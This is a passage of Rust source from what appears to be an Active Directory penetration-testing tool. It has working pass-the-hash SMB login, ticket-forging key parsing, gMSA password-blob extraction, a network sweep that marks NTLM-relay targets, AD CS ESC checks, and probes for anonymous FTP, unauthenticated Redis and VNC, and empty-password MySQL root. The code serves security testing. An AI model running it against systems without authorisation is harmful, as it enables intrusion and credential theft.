/// 5. Empty string — downstream code returns its own "needs password" error.
pub(crate) fn resolve_secret(argv_value: &str, env_key: &str) -> Result<String> {
    if let Some(path) = argv_value.strip_prefix("@file:") {
        let raw =
            std::fs::read_to_string(path).with_context(|| format!("read password file {path}"))?;
        // Strip a single trailing newline (Unix or Windows) — a file created with
        // `echo pw > pw.txt` invariably has one; passing it through would break the bind.
        return Ok(raw.trim_end_matches(['\n', '\r']).to_string());
    }
    if !argv_value.is_empty() {
        return Ok(argv_value.to_string());
    }
    if let Ok(v) = std::env::var(env_key) {
        if !v.is_empty() {
            return Ok(v);
        }
    }
    use std::io::IsTerminal;
    if std::io::stdin().is_terminal() {
        let pw = dialoguer::Password::new()
            .with_prompt(format!("password (or set {env_key})"))
            .interact()
            .context("read password from tty")?;
        return Ok(pw);
    }
    Ok(String::new())
}

#[cfg(test)]
mod resolve_secret_tests {
    use super::resolve_secret;
    use std::io::Write as _;

    #[test]
    fn literal_argv_passes_through_verbatim() {
        std::env::remove_var("ADHAMMER_TEST_UNSET");
        let got = resolve_secret("literal-pw", "ADHAMMER_TEST_UNSET").unwrap();
        assert_eq!(got, "literal-pw");
    }

    #[test]
    fn env_var_used_when_argv_empty() {
        std::env::set_var("ADHAMMER_TEST_ENV_HIT", "from-env");
        let got = resolve_secret("", "ADHAMMER_TEST_ENV_HIT").unwrap();
        std::env::remove_var("ADHAMMER_TEST_ENV_HIT");
        assert_eq!(got, "from-env");
    }

    #[test]
    fn empty_env_falls_through_to_prompt_or_empty() {
        std::env::remove_var("ADHAMMER_TEST_MISSING");
        // Under `cargo test` stdin is not a TTY, so the prompt path is skipped
        // and we get the empty-string fallback. This documents the CI/non-TTY behaviour.
        let got = resolve_secret("", "ADHAMMER_TEST_MISSING").unwrap();
        assert_eq!(got, "");
    }

    #[test]
    fn file_ref_reads_and_trims_trailing_newline() {
        let dir = std::env::temp_dir().join("adhammer_resolve_secret_tests");
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("pw.txt");
        let mut f = std::fs::File::create(&path).unwrap();
        f.write_all(b"hunter2\r\n").unwrap();
        drop(f);
        let arg = format!("@file:{}", path.display());
        let got = resolve_secret(&arg, "ADHAMMER_UNUSED").unwrap();
        assert_eq!(got, "hunter2");
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn file_ref_missing_file_is_an_error() {
        let err = resolve_secret("@file:/no/such/adhammer/pw.txt", "ADHAMMER_UNUSED").unwrap_err();
        let msg = format!("{err:#}");
        assert!(
            msg.contains("read password file"),
            "unexpected error: {msg}"
        );
    }
}

/// Parse an NT hash from `--nt-hash` (accepts bare 32-hex or `LM:NT`).
pub(crate) fn parse_nt_hash(s: &str) -> Result<[u8; 16]> {
    let hex_str = s.rsplit(':').next().unwrap_or(s).trim();
    let raw = hex::decode(hex_str).context("--nt-hash must be hex")?;
    anyhow::ensure!(
        raw.len() == 16,
        "--nt-hash must be a 32-hex NT hash (got {} bytes)",
        raw.len()
    );
    Ok(raw.try_into().unwrap())
}

/// Parse a ticket-forging key: a 16-byte NT hash (32 hex) for RC4, else a 32-byte AES256 key.
pub(crate) fn parse_forge_key(s: &str, rc4: bool) -> Result<Vec<u8>> {
    let raw = hex::decode(s.trim()).context("forge key must be hex")?;
    let want = if rc4 { 16 } else { 32 };
    anyhow::ensure!(
        raw.len() == want,
        "expected a {}-hex {} key, got {} hex",
        want * 2,
        if rc4 { "RC4/NT-hash" } else { "AES256" },
        raw.len() * 2
    );
    Ok(raw)
}

/// SMB login with either a password or an NT hash (pass-the-hash).
pub(crate) async fn smb_login(
    smb: &mut smb2_client::SmbClient,
    host: &str,
    domain: &str,
    user: &str,
    password: &str,
    nt_hash: &Option<String>,
) -> Result<()> {
    match nt_hash {
        Some(h) => {
            let nt = parse_nt_hash(h)?;
            smb.login_hash(host, domain, user, &nt).await?;
        }
        None => {
            anyhow::ensure!(!password.is_empty(), "provide --password or --nt-hash");
            smb.login(host, domain, user, password).await?;
        }
    }
    Ok(())
}

// fn exec_cmd moved to attacks::exec_pack in arch-0.

// fn wmiexec_cmd moved to attacks::exec_pack in arch-0.

// fn atexec_cmd moved to attacks::exec_pack in arch-0.

// fn secretsdump moved to attacks::secretsdump in arch-0.

// fn print_lsa_secret moved to attacks::secretsdump in arch-0.

// fn esc1 moved to attacks::esc1 in arch-0.

// fn golden moved to attacks::golden in arch-0.

// fn silver moved to attacks::silver in arch-0.

// fn pth + fn looks_like_ip moved to attacks::ptt in arch-0.

// fn gmsa moved to attacks::gmsa in arch-0.

// fn laps moved to attacks::laps in arch-0.

// fn winrm_exec moved to attacks::winrm_exec in arch-0.

/// Enumerate AD-integrated DNS over LDAP (adidnsdump-equivalent): list every zone + record from
/// the DomainDnsZones/ForestDnsZones partitions, and flag wildcard nodes — a wildcard (or any
/// writable node) turns ADIDNS into a mitm6 / WPAD name-hijack primitive.
async fn dnsenum(a: DnsArgs) -> Result<()> {
    use adhammer_collector::{Collector, LdapConfig};
    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };
    let sp = ui::Spinner::start("connecting + reading ADIDNS zones");
    let mut c = Collector::connect(&cfg).await?;
    let zones = c.read_adidns().await?;
    sp.done(&format!("{} ADIDNS zone(s) read", zones.len()));
    if zones.is_empty() {
        ui::warn("no ADIDNS zones readable");
        return Ok(());
    }
    let (mut total, mut wildcards) = (0usize, 0usize);
    for z in &zones {
        ui::header(&format!("{} ({} records)", z.name, z.records.len()));
        for r in &z.records {
            total += 1;
            let wild = r.node == "*";
            if wild {
                wildcards += 1;
            }
            let mut tags = String::new();
            if wild {
                tags.push_str(&format!("  {}", ui::accent("◄ WILDCARD")));
            }
            if r.tombstoned {
                tags.push_str(&format!("  {}", ui::dim("(tombstoned)")));
            }
            println!(
                "  {:<28} {} {}{}",
                r.node,
                ui::dim(&format!("{:<6}", r.rtype)),
                r.data,
                tags
            );
        }
    }
    ui::ok(&format!(
        "ADIDNS: {} zone(s), {total} record(s), {wildcards} wildcard(s)",
        zones.len()
    ));
    if wildcards > 0 {
        ui::warn("wildcard record present → ADIDNS/mitm6-style name-hijack surface");
    }
    Ok(())
}

/// Extract the CurrentPassword bytes from an MSDS-MANAGEDPASSWORD_BLOB (MS-ADTS §2.2.19).
pub(crate) fn parse_managed_password_blob(b: &[u8]) -> Option<Vec<u8>> {
    if b.len() < 16 {
        return None;
    }
    let cur_off = u16::from_le_bytes([b[8], b[9]]) as usize; // CurrentPasswordOffset
    let prev_off = u16::from_le_bytes([b[10], b[11]]) as usize; // PreviousPasswordOffset (0 = none)
    let end = if prev_off > cur_off {
        prev_off
    } else {
        b.len()
    };
    let pw = b.get(cur_off..end)?;
    // The password buffer is a fixed 256-byte WCHAR[128]; hash exactly those bytes.
    Some(pw.get(..256).unwrap_or(pw).to_vec())
}

// fn coerce moved to attacks::coerce in arch-0.

// fn abuse moved to attacks::abuse in arch-0.

// fn spray moved to `attacks::spray` in arch-0.
// fn lsa moved to attacks::lsa in arch-0.

// fn samr moved to attacks::samr in arch-0.

/// Common service ports scanned by the network sweep (FTP → RDP and the rest of the estate).
const SERVICES: &[(u16, &str)] = &[
    (21, "ftp"),
    (22, "ssh"),
    (23, "telnet"),
    (25, "smtp"),
    (53, "dns"),
    (80, "http"),
    (88, "kerberos"),
    (110, "pop3"),
    (111, "rpcbind"),
    (135, "msrpc"),
    (139, "netbios"),
    (143, "imap"),
    (389, "ldap"),
    (443, "https"),
    (445, "smb"),
    (464, "kpasswd"),
    (587, "smtp"),
    (636, "ldaps"),
    (873, "rsync"),
    (993, "imaps"),
    (995, "pop3s"),
    (1433, "mssql"),
    (1521, "oracle"),
    (2049, "nfs"),
    (3268, "gc"),
    (3306, "mysql"),
    (3389, "rdp"),
    (5432, "postgres"),
    (5900, "vnc"),
    (5985, "winrm"),
    (5986, "winrm-s"),
    (6379, "redis"),
    (8080, "http-alt"),
    (8443, "https-alt"),
    (9200, "elastic"),
];
/// Ports whose services send a text greeting on connect — grab it for version intel.
const GREETERS: &[u16] = &[21, 22, 25, 110, 143];

// RelayAction + RelayArgs+ RelayTarget + fn relay + relay_one + relay_esc8 + relay_icpr + pem_wrap moved to attacks::relay in arch-0.

/// Network sweep: full service scan + banner grab per target, DC detection, and SMB signing
/// (NTLM-relay) posture — the attack-surface map for the whole estate.
async fn netenum(a: NetArgs) -> Result<()> {
    let hosts = expand_targets(&a.targets)?;
    let sp = ui::Spinner::start(format!(
        "sweeping {} host(s) × {} ports",
        hosts.len(),
        SERVICES.len()
    ));

    let sem = std::sync::Arc::new(tokio::sync::Semaphore::new(a.concurrency));
    let mut set = tokio::task::JoinSet::new();
    for host in hosts {
        for &(port, svc) in SERVICES {
            let sem = sem.clone();
            let host = host.clone();
            set.spawn(async move {
                let _permit = sem.acquire().await.ok()?;
                let banner = probe_port(&host, port).await?; // None if closed
                Some((host, port, svc, banner))
            });
        }
    }
    // Group open ports by host. (port, service-name, optional banner)
    type PortEntry = (u16, &'static str, Option<String>);
    let mut hosts_map: std::collections::HashMap<String, Vec<PortEntry>> = Default::default();
    while let Some(r) = set.join_next().await {
        if let Ok(Some((host, port, svc, banner))) = r {
            hosts_map.entry(host).or_default().push((port, svc, banner));
        }
    }

    // SMB signing (relay) posture for hosts exposing 445.
    let mut signing: std::collections::HashMap<String, (u16, bool)> = Default::default();
    for (host, ports) in &hosts_map {
        if ports.iter().any(|(p, _, _)| *p == 445) {
            if let Ok(mut c) = smb2_client::SmbClient::connect(host).await {
                if let Ok(s) = c.probe_signing().await {
                    signing.insert(host.clone(), s);
                }
            }
        }
    }

    let mut hosts_sorted: Vec<_> = hosts_map.into_iter().collect();
    hosts_sorted.sort_by_key(|(h, _)| {
        h.parse::<std::net::Ipv4Addr>()
            .map(u32::from)
            .unwrap_or(u32::MAX)
    });

    if hosts_sorted.is_empty() {
        sp.done_warn("no live hosts found in range");
    } else {
        sp.done(&format!("{} live host(s)", hosts_sorted.len()));
    }
    ui::header(&format!(
        "network sweep — {} live host(s)",
        hosts_sorted.len()
    ));
    let mut relay = Vec::new();
    for (host, mut ports) in hosts_sorted {
        ports.sort_by_key(|(p, _, _)| *p);
        let has = |p: u16| ports.iter().any(|(x, _, _)| *x == p);
        let role = if has(88) && has(389) { "DC  " } else { "host" };
        println!("  {host:<15} {role}");
        for (port, svc, banner) in &ports {
            let b = banner
                .as_deref()
                .map(|s| format!("  {s}"))
                .unwrap_or_default();
            println!("      {port:<5} {svc:<10}{b}");
        }
        if let Some((d, req)) = signing.get(&host) {
            if *req {
                println!("      445   smb-signing REQUIRED (0x{d:04x})");
            } else {
                println!("      445   smb-signing OFF → NTLM-RELAY TARGET (0x{d:04x})");
                relay.push(host.clone());
            }
        }
        if a.deep {
            for (port, _, _) in &ports {
                if let Some(finding) = deep_check(&host, *port, a.zone.as_deref()).await {
                    println!("      [!]   {port:<5} {finding}");
                }
            }
            // SNMP is UDP/161 — not in the TCP sweep, so probe it per host under --deep.
            if let Some(finding) = snmp_public(&host, &a.community).await {
                println!("      [!]   161   {finding}");
            }
        }
    }
    if !relay.is_empty() {
        println!(
            "\n[+] {} NTLM-relay target(s) (SMB signing not required): {}",
            relay.len(),
            relay.join(", ")
        );
    }
    Ok(())
}

/// Connect to `host:port` (timeout). Returns Some(banner) if open — banner is the service
/// greeting for text protocols, empty otherwise; None if the port is closed/filtered.
async fn probe_port(host: &str, port: u16) -> Option<Option<String>> {
    use tokio::io::AsyncReadExt;
    use tokio::time::{timeout, Duration};
    let connect = smb2_client::socks::dial(host, port);
    let mut stream = match timeout(Duration::from_millis(800), connect).await {
        Ok(Ok(s)) => s,
        _ => return None, // closed / filtered
    };
    if !GREETERS.contains(&port) {
        return Some(None);
    }
    // Read the service greeting (FTP/SSH/SMTP/POP3/IMAP announce on connect).
    let mut buf = [0u8; 256];
    let banner = match timeout(Duration::from_millis(600), stream.read(&mut buf)).await {
        Ok(Ok(n)) if n > 0 => {
            let line = String::from_utf8_lossy(&buf[..n]);
            Some(line.lines().next().unwrap_or("").trim().to_string())
        }
        _ => None,
    };
    Some(banner)
}

/// Per-service unauthenticated attack checks (--deep).
async fn deep_check(host: &str, port: u16, zone: Option<&str>) -> Option<String> {
    match port {
        21 => ftp_anon(host).await,
        25 => smtp_vrfy(host).await,
        53 => dns_check(host, zone).await,
        111 => nfs_showmount(host).await, // portmap → mountd EXPORT; covers NFS behind it
        135 => rpc_surface(host).await,
        873 => rsync_modules(host).await,
        1433 => mssql_prelogin(host).await,
        3306 => mysql_probe(host).await,
        6379 => redis_unauth(host).await,
        5900 => vnc_noauth(host).await,
        5985 | 5986 => winrm_probe(host, port).await,
        _ => None,
    }
}

async fn connect(host: &str, port: u16) -> Option<tokio::net::TcpStream> {
    tokio::time::timeout(
        std::time::Duration::from_millis(1200),
        smb2_client::socks::dial(host, port),
    )
    .await
    .ok()?
    .ok()
}
async fn read_some(s: &mut tokio::net::TcpStream, buf: &mut [u8]) -> usize {
    use tokio::io::AsyncReadExt;
    tokio::time::timeout(std::time::Duration::from_millis(900), s.read(buf))
        .await
        .ok()
        .and_then(|r| r.ok())
        .unwrap_or(0)
}

/// Registry-only AD CS ESC checks (ESC6/10/11/16) over MS-RRP: authenticate over SMB, open
/// `\winreg`, read the CA/DC registry values, and decide each ESC. Needs the target's Remote
/// Registry service reachable.
async fn esc_registry_scan(a: EscArgs) -> Result<()> {
    use crate::esc_registry::{esc10, esc11, esc16, esc6, esc7};
    use dcerpc::rrp::RegistryClient;
    use smb2_client::SmbClient;

    let sp = ui::Spinner::start(format!("{} — SMB auth + \\winreg", a.host));
    let mut smb = SmbClient::connect(&a.host).await?;
    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    let mut reg = RegistryClient::connect(&mut smb, &a.domain, &a.user, &a.password, &a.host)
        .await
        .map_err(|e| {
            // 0xC00000AC = STATUS_ILLEGAL_FUNCTION → \winreg pipe not exposed, i.e. the
            // Remote Registry service is stopped/disabled. Very common on hardened DCs.
            let msg = e.to_string();
            if msg.contains("0xc00000ac") || msg.contains("open \\winreg") {
                anyhow::anyhow!(
                    "\\winreg unreachable on {} — the Remote Registry service is stopped or \
                     disabled (STATUS_ILLEGAL_FUNCTION 0xC00000AC). Start it on the CA host \
                     (`Set-Service RemoteRegistry -StartupType Automatic; Start-Service RemoteRegistry`) \
                     then rerun. ESC1/2/3/4/9/13 don't need this — only ESC6/10/11/16 read \
                     registry state.",
                    a.host
                )
            } else {
                e.into()
            }
        })?;
    sp.done("Remote Registry reachable");

    ui::header(&format!("AD CS registry ESC checks — CA {}", a.ca));
    let ca = format!(
        "SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\{}",
        a.ca
    );
    let mut hits = Vec::new();

    // InterfaceFlags sits directly under the CA config key. If absent, the default lacks
    // IF_ENFORCEENCRYPTICERTREQUEST (relayable), so treat a missing value as 0 rather than skipping.
    let iflags = reg
        .read_value(&ca, "InterfaceFlags")
        .await
        .ok()
        .and_then(|v| v.as_dword())
        .unwrap_or(0);
    hits.extend(esc11(iflags));

    // EditFlags and DisableExtensionList live under the *active policy module* subkey, whose name
    // is the `Active` REG_SZ under `<CA>\PolicyModules` (e.g. CertificateAuthority_MicrosoftDefault.Policy).
    let pm_root = format!("{ca}\\PolicyModules");
    let policy = reg
        .read_value(&pm_root, "Active")
        .await
        .map(|v| v.as_string())
        .unwrap_or_else(|_| "CertificateAuthority_MicrosoftDefault.Policy".into());
    let policy_key = format!("{pm_root}\\{policy}");
    if let Ok(v) = reg.read_value(&policy_key, "EditFlags").await {
        if let Some(d) = v.as_dword() {
            hits.extend(esc6(d));
        }
    }
    if let Ok(v) = reg.read_value(&policy_key, "DisableExtensionList").await {
        hits.extend(esc16(&v.as_string()));
    }
    // ESC7 — the CA `Security` REG_BINARY is a SECURITY_DESCRIPTOR; flag non-Tier-0 ManageCA/Certs.
    if let Ok(v) = reg.read_value(&ca, "Security").await {
        hits.extend(esc7(&v.data));
    }
    // ESC10 lives on the DC's Kdc key and only applies to a DC. Confirm DC-ness via NTDS first so an
    // absent value on a CA-only host isn't mis-flagged; on a real DC, an absent value is NOT
    // automatically safe (weak default on 2016–2022), so flag it with that caveat.
    let is_dc = reg
        .read_value(
            "SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters",
            "DSA Working Directory",
        )
        .await
        .is_ok()
        || reg
            .read_value(
                "SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters",
                "Machine DN Name",
            )
            .await
            .is_ok();
    if is_dc {
        match reg
            .read_value(
                "SYSTEM\\CurrentControlSet\\Services\\Kdc",
                "StrongCertificateBindingEnforcement",
            )
            .await
        {
            Ok(v) => match v.as_dword() {
                Some(d) => hits.extend(esc10(d)),
                None => hits.push(crate::esc_registry::esc10_absent()),
            },
            Err(_) => hits.push(crate::esc_registry::esc10_absent()),
        }
    }

    if hits.is_empty() {
        ui::ok("no registry-based ESC (ESC6/10/11/16) exposure found");
    } else {
        for h in &hits {
            ui::warn(&format!("{} — {}", h.id, h.title));
            ui::field("detail", &h.detail);
        }
        ui::warn(&format!(
            "{} registry-based ESC exposure(s) on {}",
            hits.len(),
            a.host
        ));
    }
    Ok(())
}

// fn zerologon moved to `attacks::zerologon` in arch-0.
async fn posture_scan(a: PostureArgs) -> Result<()> {
    use crate::host_posture::{ldap_channel_binding, ldap_signing, spooler_running};
    use dcerpc::rrp::RegistryClient;
    use smb2_client::SmbClient;

    let sp = ui::Spinner::start(format!("{} — SMB auth + \\winreg", a.host));
    let mut smb = SmbClient::connect(&a.host).await?;
    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    // Read the NTDS relay-posture values, scoped so the RRP client releases the SMB session.
    let ntds = "SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters";
    let (signing, cbt) = {
        let mut reg = RegistryClient::connect(&mut smb, &a.domain, &a.user, &a.password, &a.host)
            .await
            .map_err(|e| {
                // 0xC00000AC = STATUS_ILLEGAL_FUNCTION → \winreg pipe not exposed, i.e. the
                // Remote Registry service is stopped/disabled. Very common on hardened DCs
                // and on fresh Server 2022/2025 installs.
                let msg = e.to_string();
                if msg.contains("0xc00000ac") || msg.contains("open \\winreg") {
                    anyhow::anyhow!(
                        "\\winreg unreachable on {} — the Remote Registry service is stopped or \
                         disabled (STATUS_ILLEGAL_FUNCTION 0xC00000AC). Start it on the DC \
                         (`Set-Service RemoteRegistry -StartupType Automatic; Start-Service RemoteRegistry`) \
                         then rerun. Spooler-only posture still runs without it — but the LDAP \
                         signing / channel binding values require registry read.",
                        a.host
                    )
                } else {
                    e.into()
                }
            })?;
        let s = reg
            .read_value(ntds, "LDAPServerIntegrity")
            .await
            .ok()
            .and_then(|v| v.as_dword());
        let c = reg
            .read_value(ntds, "LdapEnforceChannelBinding")
            .await
            .ok()
            .and_then(|v| v.as_dword());
        (s, c)
    };
    // Spooler running? The \spoolss pipe answering means the service is up.
    let spooler_open = smb.open_pipe("spoolss").await.is_ok();
    sp.done("posture read");

    ui::header(&format!("DC posture — {}", a.host));
    let mut hits = Vec::new();
    hits.extend(ldap_signing(signing));
    hits.extend(ldap_channel_binding(cbt));
    hits.extend(spooler_running(spooler_open));

    if hits.is_empty() {
        ui::ok("LDAP signing + channel binding enforced, no Spooler on the DC — no relay/coercion posture exposure");
    } else {
        for h in &hits {
            ui::warn(&format!("[{}] {} — {}", h.severity, h.id, h.title));
            ui::field("detail", &h.detail);
        }
        ui::warn(&format!(
            "{} relay/coercion posture exposure(s) on {}",
            hits.len(),
            a.host
        ));
    }
    Ok(())
}

/// True if an HTTP reply to `/certsrv` is an NTLM/Negotiate 401 over cleartext HTTP — the
/// relayable ESC8 web-enrollment surface (no TLS ⇒ no channel binding to stop the relay).
fn is_esc8_response(resp: &str) -> bool {
    let head = resp.split("\r\n\r\n").next().unwrap_or(resp);
    let low = head.to_ascii_lowercase();
    head.contains(" 401")
        && low.contains("www-authenticate")
        && (low.contains("negotiate") || low.contains("ntlm"))
}

/// ESC8 detection: probe a CA host's web-enrollment endpoint over HTTP/80. A cleartext NTLM 401
/// means the CA is relay-enrollable (coerce a machine → relay its NTLM to `/certsrv` → machine
/// cert → PKINIT → its TGT). Returns the finding text, or None if not exposed on HTTP.
async fn esc8_probe(host: &str) -> Option<String> {
    use tokio::io::AsyncWriteExt;
    let mut s = connect(host, 80).await?;
    let req =
        format!("GET /certsrv/certfnsh.asp HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n");
    s.write_all(req.as_bytes()).await.ok()?;
    let mut buf = [0u8; 2048];
    let n = read_some(&mut s, &mut buf).await;
    is_esc8_response(&String::from_utf8_lossy(&buf[..n])).then(|| {
        format!(
            "ESC8: web enrollment at http://{host}/certsrv exposes NTLM over cleartext (relayable)"
        )
    })
}

/// Enumerate enterprise CAs and actively check each for ESC8 web-enrollment exposure. ESC8 is
/// relay-only, so it can't be decided from the passive LDAP snapshot — this probes the CA host.
async fn adcsenum(a: DnsArgs) -> Result<()> {
    use adhammer_collector::{Collector, LdapConfig};
    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };
    let sp = ui::Spinner::start("enumerating enterprise CAs");
    let mut c = Collector::connect(&cfg).await?;
    let cas = c.read_cas().await?;
    sp.done(&format!("{} enterprise CA(s) found", cas.len()));
    if cas.is_empty() {
        ui::warn("no enterprise CA found in the forest");
        return Ok(());
    }
    ui::header("AD CS — Certification Authorities");
    let mut esc8 = 0usize;
    for (name, host) in &cas {
        ui::field(
            &format!("CA {name}"),
            &format!("host {}", if host.is_empty() { "?" } else { host }),
        );
        if host.is_empty() {
            continue;
        }
        let sp = ui::Spinner::start(format!("probing {host} web enrollment (ESC8)"));
        let hit = esc8_probe(host).await;
        match hit {
            Some(d) => {
                esc8 += 1;
                sp.done_warn(&d);
            }
            None => sp.done(&format!(
                "{host}: ESC8 web enrollment not exposed over http/80"
            )),
        }
    }
    if esc8 > 0 {
        ui::warn(&format!(
            "AD CS: {esc8} ESC8 web-enrollment exposure(s) across {} CA(s)",
            cas.len()
        ));
    } else {
        ui::ok(&format!(
            "AD CS: {} CA(s), no ESC8 web-enrollment exposure",
            cas.len()
        ));
    }
    ui::info("ESC11 (unencrypted ICPR) detection: follow-up — needs a CA config read");
    Ok(())
}

async fn ftp_anon(host: &str) -> Option<String> {
    use tokio::io::AsyncWriteExt;
    let mut s = connect(host, 21).await?;
    let mut buf = [0u8; 512];
    read_some(&mut s, &mut buf).await; // 220 banner
    s.write_all(b"USER anonymous\r\n").await.ok()?;
    read_some(&mut s, &mut buf).await;
    s.write_all(b"PASS anonymous@adhammer\r\n").await.ok()?;
    let n = read_some(&mut s, &mut buf).await;
    String::from_utf8_lossy(&buf[..n])
        .starts_with("230")
        .then(|| "FTP: ANONYMOUS LOGIN ALLOWED".to_string())
}

async fn smtp_vrfy(host: &str) -> Option<String> {
    use tokio::io::AsyncWriteExt;
    let mut s = connect(host, 25).await?;
    let mut buf = [0u8; 512];
    read_some(&mut s, &mut buf).await;
    s.write_all(b"VRFY root\r\n").await.ok()?;
    let n = read_some(&mut s, &mut buf).await;
    let r = String::from_utf8_lossy(&buf[..n]);
    (r.starts_with("250") || r.starts_with("252"))
        .then(|| "SMTP: VRFY enabled (user enumeration)".to_string())
}

async fn redis_unauth(host: &str) -> Option<String> {
    use tokio::io::AsyncWriteExt;
    let mut s = connect(host, 6379).await?;
    s.write_all(b"INFO\r\n").await.ok()?;
    let mut buf = [0u8; 512];
    let n = read_some(&mut s, &mut buf).await;
    String::from_utf8_lossy(&buf[..n])
        .contains("redis_version")
        .then(|| "REDIS: UNAUTHENTICATED (no AUTH required)".to_string())
}

/// EPM (135): report which attack-relevant RPC interfaces are registered on the endpoint mapper.
async fn rpc_surface(host: &str) -> Option<String> {
    use dcerpc::{epm, Syntax};
    let ifaces = [
        (
            "e3514235-4b06-11d1-ab04-00c04fc2dcd2",
            4u16,
            0u16,
            "DRSUAPI(dcsync)",
        ),
        ("367abb81-9844-35f1-ad32-98f038001003", 2, 0, "SVCCTL(exec)"),
        ("86d35949-83c9-4044-b424-db363231fd0c", 1, 0, "TSCH(exec)"),
        (
            "338cd001-2244-31f1-aaaa-900038001003",
            1,
            0,
            "RemoteRegistry",
        ),
        (
            "c681d488-d850-11d0-8c52-00c04fd90f7e",
            1,
            0,
            "EFSR(petitpotam)",
        ),
        (
            "12345678-1234-abcd-ef00-0123456789ab",
            1,
            0,
            "RPRN(printerbug)",
        ),
    ];
    let mut found = Vec::new();
    for (uuid, maj, min, name) in ifaces {
        if epm::resolve_port(host, Syntax::new(uuid, maj, min))
            .await
            .is_ok()
        {
            found.push(name);
        }
    }
    (!found.is_empty()).then(|| format!("RPC/EPM registered: {}", found.join(", ")))
}

/// VNC (5900): RFB handshake — flag if security-type None (no auth) is offered.
async fn vnc_noauth(host: &str) -> Option<String> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let mut s = connect(host, 5900).await?;
    let mut ver = [0u8; 12];
    tokio::time::timeout(
        std::time::Duration::from_millis(900),
        s.read_exact(&mut ver),
    )
    .await
    .ok()?
    .ok()?;
    if &ver[0..3] != b"RFB" {
        return None;
    }
    s.write_all(&ver).await.ok()?; // accept the server's protocol version
    let mut buf = [0u8; 64];
    let n = read_some(&mut s, &mut buf).await;
    let v = String::from_utf8_lossy(&ver).trim().to_string();
    if n >= 2 {
        let count = buf[0] as usize;
        if buf[1..(1 + count).min(n)].contains(&1) {
            return Some(format!("VNC ({v}): NO AUTH (security-type None offered)"));
        }
        return Some(format!("VNC ({v}): auth required"));
    }
    None
}

/// WinRM (5985/5986): probe /wsman and report the offered HTTP auth methods.
async fn winrm_probe(host: &str, port: u16) -> Option<String> {
    use tokio::io::AsyncWriteExt;
    let mut s = connect(host, port).await?;
    let req = format!("POST /wsman HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/soap+xml;charset=UTF-8\r\nContent-Length: 0\r\n\r\n");
    s.write_all(req.as_bytes()).await.ok()?;
    let mut buf = [0u8; 1024];
    let n = read_some(&mut s, &mut buf).await;
    let r = String::from_utf8_lossy(&buf[..n]);
    if r.contains(" 401") {
        let mut m = Vec::new();
        for a in ["Negotiate", "NTLM", "Kerberos", "Basic"] {
            if r.contains(a) {
                m.push(a);
            }
        }
        Some(format!(
            "WinRM: enabled (auth: {})",
            if m.is_empty() {
                "unknown".into()
            } else {
                m.join("/")
            }
        ))
    } else {
        r.contains("HTTP/1.")
            .then(|| "WinRM: HTTP responding".to_string())
    }
}

/// Rsync (873): speak the rsyncd greeting and list modules — a blank module name asks the
/// daemon to enumerate everything it exports (classic anonymous-rsync exposure).
async fn rsync_modules(host: &str) -> Option<String> {
    use tokio::io::AsyncWriteExt;
    let mut s = connect(host, 873).await?;
    let mut buf = [0u8; 1024];
    let n = read_some(&mut s, &mut buf).await; // "@RSYNCD: <ver>\n"
    let greet = String::from_utf8_lossy(&buf[..n]);
    let ver = greet.strip_prefix("@RSYNCD:").map(|v| v.trim())?;
    // Echo the version back, then send an empty module name to request the module list.
    s.write_all(format!("@RSYNCD: {ver}\n").as_bytes())
        .await
        .ok()?;
    s.write_all(b"\n").await.ok()?;
    let n = read_some(&mut s, &mut buf).await;
    let body = String::from_utf8_lossy(&buf[..n]);
    let mods: Vec<&str> = body
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with("@RSYNCD"))
        .map(|l| l.split_whitespace().next().unwrap_or(l))
        .collect();
    if mods.is_empty() {
        Some("RSYNC: daemon reachable (no anonymous modules listed)".to_string())
    } else {
        Some(format!(
            "RSYNC: {} module(s) exported: {}",
            mods.len(),
            mods.join(", ")
        ))
    }
}

/// MySQL (3306): parse the initial handshake for the server version, then test an
/// empty-password `root` login — a real credential finding, consistent with the other
/// deep checks (FTP anon / Redis unauth).
async fn mysql_probe(host: &str) -> Option<String> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let mut s = connect(host, 3306).await?;
    // --- read the server's initial HandshakeV10 packet ---
    let mut hdr = [0u8; 4];
    tokio::time::timeout(
        std::time::Duration::from_millis(1000),
        s.read_exact(&mut hdr),
    )
    .await
    .ok()?
    .ok()?;
    let plen = (hdr[0] as usize) | (hdr[1] as usize) << 8 | (hdr[2] as usize) << 16;
    if !(1..=1024).contains(&plen) {
        return None;
    }
    let mut pkt = vec![0u8; plen];
    s.read_exact(&mut pkt).await.ok()?;
    if pkt.first() != Some(&10) {
        // Not protocol 10 — could be an ERR (e.g. host not allowed). Report what we can.
        if pkt.first() == Some(&0xff) {
            return Some("MySQL: reachable, host-not-allowed / access denied".to_string());
        }
        return Some("MySQL: reachable (unrecognized handshake)".to_string());
    }
    let ver_end = pkt[1..].iter().position(|&b| b == 0).map(|p| p + 1)?;
    let version = String::from_utf8_lossy(&pkt[1..ver_end]).to_string();

    // --- HandshakeResponse41: user root, empty auth, native-password plugin ---
    let mut body = Vec::new();
    body.extend_from_slice(&0x0008_8201u32.to_le_bytes()); // LONG_PASSWORD|PROTOCOL_41|SECURE_CONNECTION|PLUGIN_AUTH
    body.extend_from_slice(&0x0100_0000u32.to_le_bytes()); // max packet 16M
    body.push(0x21); // charset utf8
    body.extend_from_slice(&[0u8; 23]); // reserved
    body.extend_from_slice(b"root\0");
    body.push(0x00); // auth-response length = 0 (empty password)
    body.extend_from_slice(b"mysql_native_password\0");
    let mut resp = vec![
